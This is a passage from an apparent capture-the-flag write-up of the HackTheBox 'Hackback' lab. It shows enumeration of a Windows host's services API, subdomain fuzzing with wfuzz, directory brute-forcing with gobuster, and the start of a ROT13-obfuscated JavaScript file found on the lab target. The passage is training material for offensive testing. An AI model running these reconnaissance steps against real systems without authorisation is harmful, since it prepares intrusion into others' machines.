class="attr">"OsMaxNumberOfProcesses"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsMaxProcessMemorySize"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsMuiLanguages"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsNumberOfLicensedUsers"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsNumberOfProcesses"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsNumberOfUsers"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsOrganization"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsArchitecture"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsLanguage"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsProductSuites"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsOtherTypeDescription"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsPAEEnabled"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsPortableOperatingSystem"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsPrimary"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsProductType"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsRegisteredUser"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsSerialNumber"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsServicePackMajorVersion"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsServicePackMinorVersion"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsStatus"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsSuites"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"OsServerLevel"</span>:  <span class="number">4</span>,</span><br><span class="line">    <span class="attr">"KeyboardLayout"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"TimeZone"</span>:  <span class="string">"(UTC-08:00) Pacific Time (US \u0026 Canada)"</span>,</span><br><span class="line">    <span class="attr">"LogonServer"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"PowerPlatformRole"</span>:  <span class="number">1</span>,</span><br><span class="line">    <span class="attr">"HyperVisorPresent"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"HyperVRequirementDataExecutionPreventionAvailable"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"HyperVRequirementSecondLevelAddressTranslation"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"HyperVRequirementVirtualizationFirmwareEnabled"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"HyperVRequirementVMMonitorModeExtensions"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"DeviceGuardSmartStatus"</span>:  <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"DeviceGuardRequiredSecurityProperties"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"DeviceGuardAvailableSecurityProperties"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"DeviceGuardSecurityServicesConfigured"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"DeviceGuardSecurityServicesRunning"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"DeviceGuardCodeIntegrityPolicyEnforcementStatus"</span>:  <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">"DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus"</span>:  <span class="literal">null</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>/services</code> lists the services, that’s also important and we might need it later :</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/services</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"name"</span>:  <span class="string">"AJRouter"</span>,</span><br><span class="line">        <span class="attr">"startname"</span>:  <span class="string">"NT AUTHORITY\\LocalService"</span>,</span><br><span class="line">        <span class="attr">"displayname"</span>:  <span class="string">"AllJoyn Router Service"</span>,</span><br><span class="line">        <span class="attr">"status"</span>:  <span class="string">"OK"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"name"</span>:  <span class="string">"ALG"</span>,</span><br><span class="line">        <span class="attr">"startname"</span>:  <span class="string">"NT AUTHORITY\\LocalService"</span>,</span><br><span class="line">        <span class="attr">"displayname"</span>:  <span class="string">"Application Layer Gateway Service"</span>,</span><br><span class="line">        <span class="attr">"status"</span>:  <span class="string">"OK"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"name"</span>:  <span class="string">"AppHostSvc"</span>,</span><br><span class="line">        <span class="attr">"startname"</span>:  <span class="string">"localSystem"</span>,</span><br><span class="line">        <span class="attr">"displayname"</span>:  <span class="string">"Application Host Helper Service"</span>,</span><br><span class="line">        <span class="attr">"status"</span>:  <span class="string">"OK"</span></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    -------------------</span><br><span class="line">    Removed Long Output</span><br><span class="line">    -------------------</span><br><span class="line">    </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"name"</span>:  <span class="string">"WpnService"</span>,</span><br><span class="line">        <span class="attr">"startname"</span>:  <span class="string">"LocalSystem"</span>,</span><br><span class="line">        <span class="attr">"displayname"</span>:  <span class="string">"Windows Push Notifications System Service"</span>,</span><br><span class="line">        <span class="attr">"status"</span>:  <span class="string">"OK"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"name"</span>:  <span class="string">"WSearch"</span>,</span><br><span class="line">        <span class="attr">"startname"</span>:  <span class="string">"LocalSystem"</span>,</span><br><span class="line">        <span class="attr">"displayname"</span>:  <span class="string">"Windows Search"</span>,</span><br><span class="line">        <span class="attr">"status"</span>:  <span class="string">"OK"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"name"</span>:  <span class="string">"wuauserv"</span>,</span><br><span class="line">        <span class="attr">"startname"</span>:  <span class="string">"LocalSystem"</span>,</span><br><span class="line">        <span class="attr">"displayname"</span>:  <span class="string">"Windows Update"</span>,</span><br><span class="line">        <span class="attr">"status"</span>:  <span class="string">"OK"</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p><code>/netstat</code> lists the listening ports, we can check that when we need to know about some internal services but for now we will just ignore it. The rest of the commands are not really doing anything useful. I tried to exploit this service since it’s executing system commands, however it wasn’t possible.<br>I used <code>wfuzz</code> with <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt" target="_blank" rel="noopener">subdomains-top1million-5000.txt</a> from <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener">seclists</a> to enumerate any possible subdomains :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;hackback# wfuzz --hc 614 -c -w subdomains-top1mil-5000.txt -H &quot;HOST: FUZZ.hackback.htb&quot; http:&#x2F;&#x2F;10.10.10.128</span><br><span class="line"></span><br><span class="line">Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.</span><br><span class="line"></span><br><span class="line">*****</span><br><span class="line">* Wfuzz 2.3.4 - The Web Fuzzer                         *</span><br><span class="line">*****                              </span><br><span class="line">Target: http:&#x2F;&#x2F;10.10.10.128&#x2F;</span><br><span class="line">Total requests: 4997</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">ID   Response   Lines      Word         Chars          Payload</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">000007:  C&#x3D;200     33 L       54 W          614 Ch        &quot;webdisk&quot;</span><br><span class="line">000008:  C&#x3D;200     33 L       54 W          614 Ch        &quot;pop&quot;</span><br><span class="line">000001:  C&#x3D;200     33 L       54 W          614 Ch        &quot;www&quot;</span><br><span class="line">000002:  C&#x3D;200     33 L       54 W          614 Ch        &quot;mail&quot;</span><br><span class="line">000005:  C&#x3D;200     33 L       54 W          614 Ch        &quot;webmail&quot;</span><br><span class="line">000006:  C&#x3D;200     33 L       54 W          614 Ch        &quot;smtp&quot;</span><br><span class="line">000009:  C&#x3D;200     33 L       54 W          614 Ch        &quot;cpanel&quot;</span><br><span class="line">000010:  C&#x3D;200     33 L       54 W          614 Ch        &quot;whm&quot;</span><br><span class="line">000003:  C&#x3D;200     33 L       54 W          614 Ch        &quot;ftp&quot;</span><br><span class="line">000004:  C&#x3D;200     33 L       54 W          614 Ch        &quot;localhost&quot;</span><br><span class="line">000011:  C&#x3D;200     33 L       54 W          614 Ch        &quot;ns1&quot;</span><br><span class="line">000013:  C&#x3D;200     33 L       54 W          614 Ch        &quot;autodiscover&quot;</span><br><span class="line">000014:  C&#x3D;200     33 L       54 W          614 Ch        &quot;autoconfig&quot;</span><br><span class="line">000015:  C&#x3D;200     33 L       54 W          614 Ch        &quot;ns&quot;</span><br><span class="line">000016:  C&#x3D;200     33 L       54 W          614 Ch        &quot;test&quot;</span><br><span class="line">000012:  C&#x3D;200     33 L       54 W          614 Ch        &quot;ns2&quot;</span><br><span class="line">000017:  C&#x3D;200     33 L       54 W          614 Ch        &quot;m&quot;</span><br><span class="line">000020:  C&#x3D;200     33 L       54 W          614 Ch        &quot;www2&quot;</span><br><span class="line">000021:  C&#x3D;200     33 L       54 W          614 Ch        &quot;ns3&quot;</span><br><span class="line">000018:  C&#x3D;200     33 L       54 W          614 Ch        &quot;blog&quot;</span><br><span class="line">000019:  C&#x3D;200     33 L       54 W          614 Ch        &quot;dev&quot;</span><br><span class="line">000023:  C&#x3D;200     33 L       54 W          614 Ch        &quot;forum&quot;</span><br><span class="line">000022:  C&#x3D;200     33 L       54 W          614 Ch        &quot;pop3&quot;</span><br><span class="line">000026:  C&#x3D;200     33 L       54 W          614 Ch        &quot;vpn&quot;</span><br><span class="line">000025:  C&#x3D;200     33 L       54 W          614 Ch        &quot;mail2&quot;</span><br><span class="line">000024:  C&#x3D;200     27 L       66 W          825 Ch        &quot;admin&quot;</span><br><span class="line">000027:  C&#x3D;200     33 L       54 W          614 Ch        &quot;mx&quot;</span><br><span class="line"></span><br><span class="line">^C </span><br><span class="line">Finishing pending requests...</span><br></pre></td></tr></table></figure>
<p><code>admin</code> gave a different response length, I added it to <code>/etc/hosts</code> :<br><img src="/images/hackthebox/hackback/3.png" alt=""><br>It had this login form :<br><img src="/images/hackthebox/hackback/4.png" alt=""><br>Which actually didn’t do anything :</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"#"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- USERNAME INPUT --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"username"</span>&gt;</span>Username<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"Enter Username"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- PASSWORD INPUT --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"password"</span>&gt;</span>Password<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">placeholder</span>=<span class="string">"Enter Password"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Log In"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"lost"</span>&gt;</span>Lost your Password?<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"signup"</span>&gt;</span>Don't have An account?<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Also the password reset and sign-up pages are non-existent :<br><img src="/images/hackthebox/hackback/5.png" alt=""><br>By looking at the page source :</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Admin Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"/css/master.css"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;script SRC="js/.js"&gt;&lt;/script&gt; --&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-box"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"img/logo.png"</span> <span class="attr">class</span>=<span class="string">"avatar"</span> <span class="attr">alt</span>=<span class="string">"Avatar Image"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Login Here<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"#"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- USERNAME INPUT --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"username"</span>&gt;</span>Username<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"Enter Username"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- PASSWORD INPUT --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"password"</span>&gt;</span>Password<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">placeholder</span>=<span class="string">"Enter Password"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Log In"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"lost"</span>&gt;</span>Lost your Password?<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"signup"</span>&gt;</span>Don't have An account?<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>We notice this weird comment : <code>&lt;!-- &lt;script SRC=&quot;js/.js&quot;&gt;&lt;/script&gt; --&gt;</code><br>However <code>/js</code> gave a <code>403</code> :<br><img src="/images/hackthebox/hackback/6.png" alt=""><br>I ran <code>gobuster</code> with <code>/usr/share/wordlists/dirb/common.txt</code> and <code>.js</code> extension :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;hackback# gobuster -u http:&#x2F;&#x2F;admin.hackback.htb&#x2F;js&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt -x js</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v2.0.1              OJ Reeves (@TheColonial)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[+] Mode         : dir</span><br><span class="line">[+] Url&#x2F;Domain   : http:&#x2F;&#x2F;admin.hackback.htb&#x2F;js&#x2F;</span><br><span class="line">[+] Threads      : 10</span><br><span class="line">[+] Wordlist     : &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt</span><br><span class="line">[+] Status codes : 200,204,301,302,307,403</span><br><span class="line">[+] Extensions   : js</span><br><span class="line">[+] Timeout      : 10s</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2019&#x2F;07&#x2F;05 09:37:16 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;private.js (Status: 200)</span><br></pre></td></tr></table></figure>


<h2 id="Script-Deobfuscation"><a href="#Script-Deobfuscation" class="headerlink" title="Script Deobfuscation"></a>Script Deobfuscation</h2><p>By looking at <code>private.js</code> it’s not really what we expect a javascript file to be :</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	ine n=[<span class="string">'\k57\k78\k49\k6n\k77\k72\k37\k44\k75\k73\k4s\k38\k47\k73\k4o\k76\k52\k77\k42\k2o\k77\k71\k33\k44\k75\k4q\k4o\k72\k77\k72\k4p\k44\k67\k63\k4s\k69\k77\k72\k59\k31\k4o\k45\k45\k67\k47\k38\k4o\k43\k77\k71\k37\k44\k6p\k38\k4o\k33'</span>,<span class="string">'\k41\k63\k4s\k4q\k77\k71\k76\k44\k71\k51\k67\k43\k77\k34\k2s\k43\k74\k32\k6r\k44\k74\k4q\k4o\k68\k5n\k63\k4o\k44\k77\k71\k54\k43\k70\k54\k73\k79\k77\k37\k6r\k43\k68\k73\k4s\k51\k58\k4q\k4s\k35\k57\k38\k4o\k70\k44\k73\k4s\k74\k4r\k43\k44\k44\k76\k41\k6n\k43\k67\k79\k6o\k3q'</span>,<span class="string">'\k77\k35\k48\k44\k72\k38\k4s\k37\k64\k44\k52\k6q\k4q\k4q\k4o\k4n\k77\k34\k6n\k44\k6p\k56\k52\k6r\k77\k72\k74\k37\k77\k37\k73\k30\k77\k6s\k31\k61\k77\k37\k73\k41\k51\k73\k4o\k73\k66\k73\k4s\k45\k77\k34\k58\k44\k73\k52\k6n\k43\k6p\k4q\k4s\k77\k46\k7n\k72\k43\k6q\k7n\k70\k76\k43\k41\k6n\k43\k75\k42\k7n\k44\k73\k73\k4o\k39\k46\k38\k4s\k34\k77\k71\k5n\k6r\k57\k73\k4o\k68'</span>];(shapgvba(p,q)&#123;ine r=shapgvba(s)&#123;juvyr(--s)&#123;p[<span class="string">'chfu'</span>](p[<span class="string">'fuvsg'</span>]());&#125;&#125;;r(++q);&#125;(n,<span class="number">0</span>k66));ine o=shapgvba(p,q)&#123;p=p<span class="number">-0</span>k0;ine r=n[p];vs(o[<span class="string">'ZfHYzi'</span>]===haqrsvarq)&#123;(shapgvba()&#123;ine s;gel&#123;ine t=Shapgvba(<span class="string">'erghea\k20(shapgvba()\k20'</span>+<span class="string">'&#123;&#125;.pbafgehpgbe(\k22erghea\k20guvf\k22)(\k20)'</span>+<span class="string">');'</span>);s=t();&#125;pngpu(u)&#123;s=jvaqbj;&#125;ine v=<span class="string">'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm0123456789+/='</span>;s[<span class="string">'ngbo'</span>]||(s[<span class="string">'ngbo'</span>]=shapgvba(w)&#123;ine x=Fgevat(w)[<span class="string">'ercynpr'</span>](<span class="regexp">/=+$/</span>,<span class="string">''</span>);sbe(ine y=<span class="number">0</span>k0,z,a,b=<span class="number">0</span>k0,c=<span class="string">''</span>;a=x[<span class="string">'puneNg'</span>](b++);~a&amp;&amp;(z=y%<span class="number">0</span>k4?z*<span class="number">0</span>k40+a:a,y++%<span class="number">0</span>k4)?c+=Fgevat[<span class="string">'sebzPunePbqr'</span>](<span class="number">0</span>kss&amp;z&gt;&gt;(<span class="number">-0</span>k2*y&amp;<span class="number">0</span>k6)):<span class="number">0</span>k0)&#123;a=v[<span class="string">'vaqrkBs'</span>](a);&#125;erghea c;&#125;);&#125;());ine d=shapgvba(e,q)&#123;ine g=[],h=<span class="number">0</span>k0,i,j=<span class="string">''</span>,k=<span class="string">''</span>;e=ngbo(e);sbe(ine l=<span class="number">0</span>k0,m=e[<span class="string">'yratgu'</span>];l&lt;m;l++)&#123;k+=<span class="string">'%'</span>+(<span class="string">'00'</span>+e[<span class="string">'punePbqrNg'</span>](l)[<span class="string">'gbFgevat'</span>](<span class="number">0</span>k10))[<span class="string">'fyvpr'</span>](<span class="number">-0</span>k2);&#125;e=qrpbqrHEVPbzcbarag(k);sbe(ine N=<span class="number">0</span>k0;N&lt;<span class="number">0</span>k100;N++)&#123;g[N]=N;&#125;sbe(N=<span class="number">0</span>k0;N&lt;<span class="number">0</span>k100;N++)&#123;h=(h+g[N]+q[<span class="string">'punePbqrNg'</span>](N%q[<span class="string">'yratgu'</span>]))%<span class="number">0</span>k100;i=g[N];g[N]=g[h];g[h]=i;&#125;N=<span class="number">0</span>k0;h=<span class="number">0</span>k0;sbe(ine O=<span class="number">0</span>k0;O&lt;e[<span 